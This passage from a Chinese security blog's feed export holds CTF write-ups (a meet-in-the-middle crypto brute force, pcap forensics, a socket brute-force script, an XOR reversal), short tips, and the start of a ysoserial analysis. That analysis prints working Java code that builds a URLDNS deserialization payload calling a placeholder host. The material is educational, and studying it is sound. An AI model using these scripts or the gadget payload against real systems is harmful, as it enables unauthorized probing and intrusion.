class="number">49</span>, <span class="number">115</span>, <span class="number">131</span>, <span class="number">35</span>,</span><br><span class="line">                <span class="number">160</span>, <span class="number">191</span>, <span class="number">42</span>, <span class="number">204</span>, <span class="number">175</span>, <span class="number">21</span>, <span class="number">202</span>, <span class="number">96</span>, <span class="number">205</span>, <span class="number">238</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">126</span>,</span><br><span class="line">                <span class="number">164</span>, <span class="number">193</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">46</span>, <span class="number">76</span>, <span class="number">252</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">116</span>, <span class="number">23</span>, <span class="number">247</span>, <span class="number">201</span>, <span class="number">84</span>,</span><br><span class="line">                <span class="number">70</span>, <span class="number">12</span>, <span class="number">184</span>, <span class="number">44</span>, <span class="number">154</span>, <span class="number">185</span>, <span class="number">30</span>, <span class="number">165</span>, <span class="number">171</span>, <span class="number">172</span>, <span class="number">39</span>, <span class="number">236</span>, <span class="number">168</span>,</span><br><span class="line">                <span class="number">57</span>, <span class="number">79</span>, <span class="number">24</span>, <span class="number">228</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">100</span>, <span class="number">196</span>, <span class="number">63</span>, <span class="number">109</span>, <span class="number">211</span>, <span class="number">206</span>, <span class="number">95</span>,</span><br><span class="line">                <span class="number">170</span>, <span class="number">251</span>, <span class="number">51</span>, <span class="number">91</span>, <span class="number">181</span>, <span class="number">136</span>, <span class="number">99</span>, <span class="number">239</span>, <span class="number">230</span>, <span class="number">87</span>, <span class="number">227</span>, <span class="number">128</span>, <span class="number">26</span>,</span><br><span class="line">                <span class="number">50</span>, <span class="number">250</span>, <span class="number">6</span>, <span class="number">255</span>, <span class="number">106</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">90</span>, <span class="number">208</span>, <span class="number">124</span>, <span class="number">166</span>, <span class="number">192</span>, <span class="number">43</span>,</span><br><span class="line">                <span class="number">141</span>, <span class="number">130</span>, <span class="number">25</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">173</span>, <span class="number">174</span>, <span class="number">150</span>, <span class="number">138</span>, <span class="number">68</span>, <span class="number">2</span>, <span class="number">240</span>, <span class="number">207</span>,</span><br><span class="line">                <span class="number">232</span>, <span class="number">77</span>, <span class="number">112</span>, <span class="number">243</span>, <span class="number">4</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">129</span>, <span class="number">125</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">103</span>, <span class="number">237</span>,</span><br><span class="line">                <span class="number">104</span>, <span class="number">18</span>, <span class="number">188</span>, <span class="number">28</span>, <span class="number">244</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">217</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">163</span>, <span class="number">151</span>,</span><br><span class="line">                <span class="number">86</span>, <span class="number">183</span>, <span class="number">190</span>, <span class="number">158</span>, <span class="number">61</span>, <span class="number">248</span>, <span class="number">214</span>, <span class="number">161</span>, <span class="number">65</span>, <span class="number">145</span>, <span class="number">155</span>, <span class="number">149</span>, <span class="number">45</span>,</span><br><span class="line">                <span class="number">14</span>, <span class="number">186</span>, <span class="number">92</span>, <span class="number">249</span>, <span class="number">198</span>, <span class="number">48</span>, <span class="number">59</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">146</span>, <span class="number">148</span>, <span class="number">153</span>, <span class="number">179</span>, <span class="number">195</span>,</span><br><span class="line">                <span class="number">72</span>, <span class="number">137</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">156</span>, <span class="number">81</span>, <span class="number">169</span>, <span class="number">17</span>, <span class="number">3</span>, <span class="number">197</span>, <span class="number">152</span>, <span class="number">210</span>, <span class="number">216</span>, <span class="number">54</span>,</span><br><span class="line">                <span class="number">37</span>, <span class="number">34</span>, <span class="number">134</span>, <span class="number">119</span>, <span class="number">89</span>, <span class="number">245</span>, <span class="number">135</span>, <span class="number">189</span>, <span class="number">101</span>, <span class="number">241</span>, <span class="number">159</span>, <span class="number">226</span>,</span><br><span class="line">                <span class="number">180</span>, <span class="number">177</span>, <span class="number">98</span>, <span class="number">8</span>, <span class="number">142</span>, <span class="number">52</span>, <span class="number">15</span>, <span class="number">71</span>, <span class="number">215</span>, <span class="number">254</span>, <span class="number">162</span>, <span class="number">133</span>, <span class="number">56</span>,</span><br><span class="line">                <span class="number">231</span>, <span class="number">0</span>, <span class="number">218</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">55</span>, <span class="number">246</span>, <span class="number">127</span>, <span class="number">13</span>, <span class="number">176</span>, <span class="number">88</span>, <span class="number">105</span>, <span class="number">38</span>, <span class="number">233</span>,</span><br><span class="line">                <span class="number">182</span>, <span class="number">203</span>, <span class="number">200</span>, <span class="number">74</span>, <span class="number">66</span>, <span class="number">73</span>, <span class="number">53</span>, <span class="number">9</span>, <span class="number">220</span>, <span class="number">139</span>, <span class="number">209</span>, <span class="number">118</span>, <span class="number">132</span>,</span><br><span class="line">                <span class="number">102</span>, <span class="number">10</span>, <span class="number">222</span>, <span class="number">75</span>, <span class="number">82</span>, <span class="number">94</span>, <span class="number">29</span>, <span class="number">113</span>, <span class="number">120</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">67</span>, <span class="number">11</span>,</span><br><span class="line">                <span class="number">235</span>, <span class="number">47</span>, <span class="number">27</span>, <span class="number">224</span>, <span class="number">199</span>, <span class="number">223</span>, <span class="number">85</span></span><br><span class="line">               &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> q[] = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">mxor</span><span class="params">(uchar* a, uchar* b, uchar* tmp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCK_LENGTH; i++) &#123;</span><br><span class="line">        tmp[i] = a[i] ^ b[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(uchar* from, uchar* to)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCK_LENGTH; i++) &#123;</span><br><span class="line">        to[i] = from[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(uchar* key, uchar* ct, uchar* tmp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROUND_COUNT; i++) &#123;</span><br><span class="line">        mxor(ct, key, tmp);</span><br><span class="line">        copy(tmp, ct);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCK_LENGTH; i++) &#123;</span><br><span class="line">            ct[i] = sbox[ct[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        uchar nct[BLOCK_LENGTH];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCK_LENGTH; i++) &#123;</span><br><span class="line">            nct[i] = ct[p[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        copy(nct, ct);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dec</span><span class="params">(uchar* key, uchar* ct, uchar* tmp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROUND_COUNT; i++) &#123;</span><br><span class="line">        uchar nct[BLOCK_LENGTH];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCK_LENGTH; i++) &#123;</span><br><span class="line">            nct[i] = ct[q[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        copy(nct, ct);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCK_LENGTH; i++) &#123;</span><br><span class="line">            ct[i] = dbox[ct[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        mxor(ct, key, tmp);</span><br><span class="line">        copy(tmp, ct);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">    uchar* md5key = <span class="keyword">new</span> uchar[BLOCK_LENGTH];</span><br><span class="line">    uchar tmp[BLOCK_LENGTH];</span><br><span class="line">    uchar hexkey[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123; <span class="comment">// 爆破明文所有 key 加密的结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++) &#123;</span><br><span class="line">                uchar pt[] = <span class="string">"16 bit plaintext"</span>;</span><br><span class="line">                copy(MD5((<span class="keyword">char</span>*)hexkey, <span class="number">3</span>).digest, md5key);</span><br><span class="line">                fun(md5key, pt, tmp);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">((<span class="keyword">char</span>*)pt, <span class="number">16</span>)</span></span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">s2</span><span class="params">((<span class="keyword">char</span>*)hexkey, <span class="number">3</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">map</span>[s1] = s2;</span><br><span class="line">                hexkey[<span class="number">2</span>] += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            hexkey[<span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        hexkey[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123; <span class="comment">// 爆破密文所有 key 解密的结果, 如果在 map 中找到一样的, 用这两个 key 拿来解密 flag</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++) &#123;</span><br><span class="line">                uchar pt[] = <span class="string">"\x04g\xa5*\xfa\x8f\x15\xcf\xb8\xf0\xea@6Zf\x92"</span>; <span class="comment">// "0467a52afa8f15cfb8f0ea40365a6692".decode('hex')</span></span><br><span class="line">                copy(MD5((<span class="keyword">char</span>*)hexkey, <span class="number">3</span>).digest, md5key);</span><br><span class="line">                dec(md5key, pt, tmp);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">((<span class="keyword">char</span>*)pt)</span></span>;</span><br><span class="line">                <span class="keyword">auto</span> ptr = <span class="built_in">map</span>.find(s1);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(ptr != <span class="built_in">map</span>.end()) &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Key found"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                    uchar key[<span class="number">3</span>];</span><br><span class="line">                    uchar flag[] = <span class="string">"\x04\xb3NZ\xf4\xa1\xf5&amp;\x0f`C\xb8\xb9\xab\xb4\xf8"</span>; <span class="comment">// "04b34e5af4a1f5260f6043b8b9abb4f8".decode('hex')</span></span><br><span class="line">                    key[<span class="number">0</span>] = (*ptr).second.c_str()[<span class="number">0</span>];</span><br><span class="line">                    key[<span class="number">1</span>] = (*ptr).second.c_str()[<span class="number">1</span>];</span><br><span class="line">                    key[<span class="number">2</span>] = (*ptr).second.c_str()[<span class="number">2</span>];</span><br><span class="line">                    copy(MD5((<span class="keyword">char</span>*)hexkey, <span class="number">3</span>).digest, md5key);</span><br><span class="line">                    dec(md5key, flag, tmp);</span><br><span class="line">                    copy(MD5((<span class="keyword">char</span>*)key, <span class="number">3</span>).digest, md5key);</span><br><span class="line">                    dec(md5key, flag, tmp);</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>((<span class="keyword">char</span>*)flag, <span class="number">16</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                hexkey[<span class="number">2</span>] += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            hexkey[<span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        hexkey[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>dbox</code> 和 <code>q</code> 可以这样生成  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dbox = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sbox))]</span><br><span class="line">q = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sbox)):</span><br><span class="line">    dbox[sbox[i]] = i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">    q[p[i]] = i</span><br></pre></td></tr></table></figure>

<p>大约需要 3g 内存和几分钟时间得到 flag<br>编译的时候别忘记带上 -O3  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Key found</span><br><span class="line">1337_1n_m1ddl38f</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>密码学博大精深, <code>Meet-in-the-middle</code> 只是其中一种攻击技术, 但其中的思路还是非常值得学习的,<br>有时候爆破不可避免, 我们能做的是如何让爆破最简化, 至少不那么暴力 233.  </p>
<p>想要了解更多关于 <code>Meet-in-the-middle</code> 的知识可以去看对应的 <a href="https://en.wikipedia.org/wiki/Meet-in-the-middle_attack" target="_blank" rel="noopener">WIKI</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>在 iOS 上信任 BurpSuite 证书</title>
    <url>/2019/03/19/%E5%9C%A8%20iOS%20%E4%B8%8A%E4%BF%A1%E4%BB%BB%20BurpSuite%20%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<p>今天突然发现在 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> 上信任证书后竟然还提示不安全…<br>原因是 iOS 更新后又添加一道防护, 得手动在<br>通用 -&gt; 关于本机 -&gt; 证书信任设置(最底下) 里面打开对 PortSwiggerCA 的信任.</p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>在路由器上运行 Python</title>
    <url>/2018/01/07/%E5%9C%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8C%20Python/</url>
    <content><![CDATA[<p>首先你需要一台运行LEDE的路由器并且拥有足量的闪存空间（大概10M), SSH连接后输入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">opkg install python3 <span class="comment"># python 如果你想装2, 7版本的py</span></span><br><span class="line">opkg install python3-pip <span class="comment"># 可以不装</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>然后等待几十秒, BOOM~  搞定. 输入 python3 就可以进入交互界面, enjoy it, 相当于树莓派了. </p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>基于 Selenium in python 的贴吧删帖机</title>
    <url>/2017/12/10/%E5%9F%BA%E4%BA%8E%20Selenium%20in%20python%20%E7%9A%84%E8%B4%B4%E5%90%A7%E5%88%A0%E5%B8%96%E6%9C%BA/</url>
    <content><![CDATA[<p>黑历史太多233 所以做了这个 主要是通过 selenium 自动操作浏览器, 不然手动可能要点半天 233 代码挺多的就不贴了, 我丢到了<a href="https://github.com/rmb122/Delete-my-hisroy-in-tieba" target="_blank" rel="noopener">github</a> 上, 欢迎 star~</p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒杯三月赛 Writeup</title>
    <url>/2018/03/25/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%89%E6%9C%88%E8%B5%9B%20Writeup/</url>
    <content><![CDATA[<h3 id="0x01-流量分析-3"><a href="#0x01-流量分析-3" class="headerlink" title="0x01 流量分析(3)"></a>0x01 流量分析(3)</h3><p>这几题流量分析感觉顺便在考察机器配置啊 233, 渣电脑估计瞬间爆炸. 相当简单, 我这里打开的是 <code>数据采集 D_eth0_NS_20160809_164452.pcap</code>, 过滤http协议, 可以看到大量来自 183.129.152.140  的流量, 可以看到是在爆破账号密码, flag{183.129.152.140}. </p>
<a id="more"></a>

<h3 id="0x02-流量分析-2"><a href="#0x02-流量分析-2" class="headerlink" title="0x02 流量分析(2)"></a>0x02 流量分析(2)</h3><p>在 <code>数据采集 H_eth0_NS_20160809_170103.pcap</code>, 中可以看到.<br><code>POST /webmail/client/index.php?module=operate&amp;action=login HTTP/1.1</code><br>猜测action还可以有send之类的, 搜索正则表达式 <code>action=.*send.*</code>, 最终在 <code>数据采集 D_eth0_NS_20160809_170427.pcap</code> 中可以找到 <code>action=mail-send-success</code>.<br>接下来追踪http流, 可以发现一个 <code>welcome to UMAIL</code>.  将其保存为html文件, 打开可以发现几个与众不同的邮箱.<br>尝试可以得到 <code>flag{xsser@live.cn}</code>.</p>
<h3 id="0x03-流量分析-1"><a href="#0x03-流量分析-1" class="headerlink" title="0x03 流量分析(1)"></a>0x03 流量分析(1)</h3><p>既然是后门, 自然要有 phpinfo() 233.搜索字符串 phpinfo, 可以找到很多, 但大多是 <code>404 not found</code>, 这里可以用 <code>(ip.src==183.129.152.140 ||ip.dst==183.129.152.140) &amp;&amp; (http.response.code!=404 || http.request)</code> 过滤一下, 然后搜索 phpinfo, 可以在 <code>数据采集 H_eth0_NS_20160809_172819.pcap</code> 里面找到后门.<br><code>flag{admin.bak.php}</code>.</p>
<h3 id="0x03-石头剪刀布"><a href="#0x03-石头剪刀布" class="headerlink" title="0x03 石头剪刀布"></a>0x03 石头剪刀布</h3><p>这题就是靠爆破啦, 但是题目有些问题, 主办方也不打算修了, 组里大佬问主办方才拿到flag, 233.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sck=socket.socket()</span><br><span class="line">sck.connect((<span class="string">"192.168.5.91"</span>,<span class="number">80</span>))</span><br><span class="line">log=open(<span class="string">'shiTouLog.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">key=open(<span class="string">'shiTouKey.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">data=sck.recv(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):    </span><br><span class="line">    sck.send(<span class="string">'0\n'</span>.encode())</span><br><span class="line">    data=sck.recv(<span class="number">2048</span>)</span><br><span class="line">    data:str=data.decode()[<span class="number">0</span>:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">"石头"</span>)!=<span class="number">-1</span>:</span><br><span class="line">        key.write(<span class="string">'2 '</span>)</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">"剪刀"</span>)!=<span class="number">-1</span>:</span><br><span class="line">        key.write(<span class="string">'0 '</span>)</span><br><span class="line">    <span class="keyword">if</span> data.find(<span class="string">"布"</span>)!=<span class="number">-1</span>:</span><br><span class="line">        key.write(<span class="string">'1 '</span>)</span><br><span class="line">    print(data)</span><br><span class="line">    log.write(data)</span><br><span class="line"></span><br><span class="line">sck.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sussces</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">key=open(<span class="string">'shiTouKey.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line">keys=key.split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sck=socket.socket()</span><br><span class="line">        sck.connect((<span class="string">"192.168.5.91"</span>,<span class="number">80</span>))</span><br><span class="line">        data=sck.recv(<span class="number">2048</span>) <span class="comment">#banner</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keys)):    </span><br><span class="line">            sck.send((str(keys[i])+<span class="string">'\n'</span>).encode())</span><br><span class="line">            data=sck.recv(<span class="number">2048</span>).decode()</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">if</span> data.find(<span class="string">'LOSE'</span>)!=<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data.find(<span class="string">'100 /100'</span>)!=<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">raise</span> sussces </span><br><span class="line">    <span class="keyword">except</span> sussces:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line">sck.close()</span><br></pre></td></tr></table></figure>

<h3 id="0x04-xor"><a href="#0x04-xor" class="headerlink" title="0x04 xor"></a>0x04 xor</h3><p>又是一题简单的逆向, ida F5, 果然是xor加密, 直接放脚本吧.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	char a[] = &#123; '\x66','\x0A','\x6B','\x0C','\x77','\x26','\x4F','\x2E','\x40','\x11','\x78','\x0D','\x5A','\x3B','\x55','\x11','\x70','\x19','\x46','\x1f', '\x76', '\x22', '\x4d', '\x23', '\x44','\x0e', '\x67', '\x6', '\x68', '\x0f', '\x47', '\x32', '\x4f','\x0'&#125;;</span><br><span class="line">	<span class="keyword">char</span> last = a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">char</span> temp = a[i];</span><br><span class="line">		a[i] = last ^ a[i];</span><br><span class="line">		last = temp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>flag{QianQiuWanDai_YiTongJiangHu}</code><br>剩下的题不是没时间做就是不会卡在一半了 233, 像什么半个二维码和谜之蜘蛛侠. 等大佬们的 Writeup 吧~</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>audit</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial URLDNS, CommonsCollectionsX 分析</title>
    <url>/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的.</p>
<a id="more"></a>

<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>最简单的一个, 这个成因就是 <code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.</p>
<p><img src="https://i.loli.net/2020/01/20/onW3ErpxJT2mK1z.png" alt=""><br><img src="https://i.loli.net/2020/01/20/xJrPjCgF5eh1Kfs.png" alt=""></p>
<p>而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p>
<p><img src="https://i.loli.net/2020/01/20/tzER6LIsc125OU7.png" alt=""><br><img src="https://i.loli.net/2020/01/20/53j1fLybKRUHsYV.png" alt="">  </p>
<p>可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求.</p>
<p>整条调用链如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>URLDNS.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxxx.xxx.xxx"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); <span class="comment">// 设一个值, 这样 put 的时候就不会去查询 DNS</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>); <span class="comment">// hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><p>这个利用链比较复杂, 借 ysoserial 自带的调用栈先看看吧,  </p>
